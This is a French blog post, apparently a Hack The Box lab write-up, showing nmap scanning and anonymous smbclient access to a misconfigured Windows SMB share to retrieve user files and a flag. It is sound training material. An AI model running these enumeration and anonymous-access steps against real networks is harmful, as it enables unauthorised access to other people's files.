---
title: "Dancing"
date: 2025-12-01
description: "Découverte du protocole SMB et des partages réseaux."
draft: false

# Tes taxonomies (correspondant à ton hugo.toml)
tags: ["Misconfiguration", "Protocol", "Nmap", "SMB", "Windows", "Tier 0"]
categories: ["Writeups", "Hack The Box", "Starting Point"]
---

# Introduction

**Dancing** est la troisième box du parcours *Starting Point* de [Hack The Box](https://www.hackthebox.com/). Après avoir vu **Telnet** et **FTP**,

{{< article link="/ravenbreach-blog/writeups/hackthebox/startingpoint/fawn/" showSummary=true compactSummary=true >}}

on s’attaque ici au protocole **SMB**. C’est une machine parfaite pour comprendre comment naviguer dans les partages réseaux Windows. Un writeup officiel existe déjà sur HTB si vous voulez un guide pas à pas.



>[!WARNING]
>Dans ce writeup, je ne publie pas directement le flag final, l’objectif est d’apprendre en pratiquant. Si vous voulez le flag, suivez les étapes sur la machine.

>[!CAUTION]
>**NOTE :** n’attaquez que des machines sur lesquelles vous avez l’autorisation (ex. machines HTB, ou lab perso). Respectez les règles de la plateforme.

## Vidéo Walkthrough

Si tu préfères regarder un tuto plutôt que lire, voici ma vidéo :

{{< youtubeLite id="vWKbqzG_u00" label="Dancing Walkthrough" >}}

---

## Reconaissance (Information gathering)

### Découverte d’hôte (Asset discovery)

Comme d’hab, la première étape est de vérifier que la machine répond avec la commande ``ping`` suivi de l’**IP** de la cible. On vérifie juste qu’on a bien une connexion stable.
```bash
┌─[user@parrot]─[~]
└──╼ $ping 10.129.63.29

PING 10.129.63.29 (10.129.63.29) 56(84) bytes of data.
64 bytes from 10.129.63.29: icmp_seq=1 ttl=127 time=14.4 ms
64 bytes from 10.129.63.29: icmp_seq=2 ttl=127 time=13.5 ms
64 bytes from 10.129.63.29: icmp_seq=3 ttl=127 time=15.0 ms
64 bytes from 10.129.63.29: icmp_seq=4 ttl=127 time=137 ms
^C
--- 10.129.63.29 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3012ms
rtt min/avg/max/mdev = 13.495/44.877/136.630/52.976 ms
```
La machine répond (le **TTL** de 127 confirme souvent qu’on est face à du Windows), on peut passer à la suite.

### Énumération des services (Service enumeration)

On lance un scan des ports pour voir ce qui tourne sur la bête. ``nmap`` est notre meilleur pote pour ça. J’utilise le flag ``-sV`` pour essayer de choper les versions des services.
```bash
┌─[user@parrot]─[~]
└──╼ $nmap -sV 10.129.63.29

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-01 21:21 UTC
Nmap scan report for 10.129.63.29
Host is up (0.27s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds
```
On repère 3 ports ouverts : le **135**, le **139** et surtout le **445**. Le service sur le **445** est **microsoft-ds**, plus connu sous le nom de **SMB** (**Server Message Block**). C’est le protocole standard pour le partage de fichiers et d’imprimantes sur un réseau local. S’il est mal configuré, il permet parfois de s’y connecter sans mot de passe. C’est exactement ce qu’on va tester.

---

## Pré-Exploitation

### Evaluation de vulnérabilité (Vulnerability Assessment)

Pour interagir avec **SMB** depuis notre terminal Linux, on utilise l’outil ``smbclient``. L’objectif est d’abord de lister les dossiers partagés (shares) disponibles sur la machine. On utilise le flag ``-L`` (List).

```bash
┌─[✗]─[user@parrot]─[~]
└──╼ $smbclient -L 10.129.63.29

Password for [WORKGROUP\user]:
```
À cette étape, on nous demande un mot de passe. On appuie juste sur Entrée sans rien écrire pour tenter une connexion anonyme.
```bash
Password for [WORKGROUP\user]:

 Sharename       Type      Comment
 ---------       ----      -------
 ADMIN$          Disk      Remote Admin
 C$              Disk      Default share
 IPC$            IPC       Remote IPC
 WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.63.29 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Bingo ! On voit 4 partages :

- **ADMIN$** et **C$** (souvent réservés aux admins)
- **IPC$**
- **WorkShares** (celui-ci a l’air custom, c’est suspect 👀)

---

## Exploitation

### Accès initial

Maintenant, on va essayer de se connecter à chacun de ces dossiers pour voir ce qu’on peut gratter. On commence par les classiques **ADMIN$** et **C$**.

```bash
┌─[user@parrot]─[~]
└──╼ $smbclient \\\\10.129.63.29\\ADMIN$

Password for [WORKGROUP\user]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```


```bash
┌─[✗]─[user@parrot]─[~]
└──╼ $smbclient \\\\10.129.63.29\\C$

Password for [WORKGROUP\user]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```
Comme prévu, “Access Denied”. On n’a pas les droits. On tente **IPC$** :

```bash
┌─[✗]─[user@parrot]─[~]
└──╼ $smbclient \\\\10.129.63.29\\IPC$

Password for [WORKGROUP\user]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*
```

La connexion passe, mais il n’y a rien à voir. Il nous reste notre meilleur espoir, **WorkShares**.

```bash
┌─[user@parrot]─[~]
└──╼ $smbclient \\\\10.129.63.29\\WorkShares

Password for [WORKGROUP\user]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 08:22:01 2021
  ..                                  D        0  Mon Mar 29 08:22:01 2021
  Amy.J                               D        0  Mon Mar 29 09:08:24 2021
  James.P                             D        0  Thu Jun  3 08:38:03 2021

  5114111 blocks of size 4096. 1749358 blocks available
```

Jackpot ! On est connecté et la commande ``ls`` nous révèle deux dossiers utilisateurs : **Amy.J** et **James.P**. Il est temps de fouiller (on loot on loot lol).

### Récupération des données

On va explorer le dossier d’Amy en premier.

```bash
smb: \> cd Amy.J
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 09:08:24 2021
  ..                                  D        0  Mon Mar 29 09:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 11:00:37 2021

  5114111 blocks of size 4096. 1749350 blocks available
```

Il y a un fichier **worknotes.txt**. On le télécharge sur notre machine avec la commande ``get``.

```bash
smb: \Amy.J\> get worknotes.txt

getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)
```

Ensuite, on check chez James.

```bash
smb: \Amy.J\> cd ../James.P\
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 08:38:03 2021
  ..                                  D        0  Thu Jun  3 08:38:03 2021
  flag.txt                            A       32  Mon Mar 29 09:26:57 2021

  5114111 blocks of size 4096. 1752993 blocks available
```

Et voilà le trésor ! Le fichier **flag.txt** est là. On le télécharge aussi.

```bash
smb: \James.P\> get flag.txt

getting file \James.P\flag.txt of size 32 as flag.txt (0.5 KiloBytes/sec) (average 0.9 KiloBytes/sec)
```

On peut quitter proprement avec ``exit``.

```bash
smb: \> exit
```

---

## Post-Exploitation

De retour sur notre machine locale, on vérifie notre butin.

```bash
┌─[user@parrot]─[~]
└──╼ $ls

Desktop    Downloads  Pictures  Templates  flag.txt
Documents  Music      Public    Videos     worknotes.txt
```

On jette un œil aux notes d’Amy pour la forme :

```bash
┌─[user@parrot]─[~]
└──╼ $cat worknotes.txt

- start apache server on the linux machine
- secure the ftp server
- setup winrm on dancing
```

C’est juste une To-Do list (ironique vu qu’elle n’a pas sécurisé le **SMB**…), ça ne nous sert pas ici. Mais gardez le réflexe : sur des machines plus complexes, c’est souvent ce genre de fichier qui vaut de l’or pour repérer le prochain vecteur d’attaque ou trouver la prochaine vulnérabilité à exploiter.

Le moment de vérité, on affiche le flag :

```bash
┌─[user@parrot]─[~]
└──╼ $cat flag.txt
 
5f6{...}664
```

La machine est ***pwned*** !

<!-- ---

## Pour aller plus loin

### Script automatisé
Ce n'est pas encore fait mais je prévois de faire un script automatisé !

### Rapport professionnel
Ce n'est pas encore fait mais je prévois de faire un rapport professionnel ! -->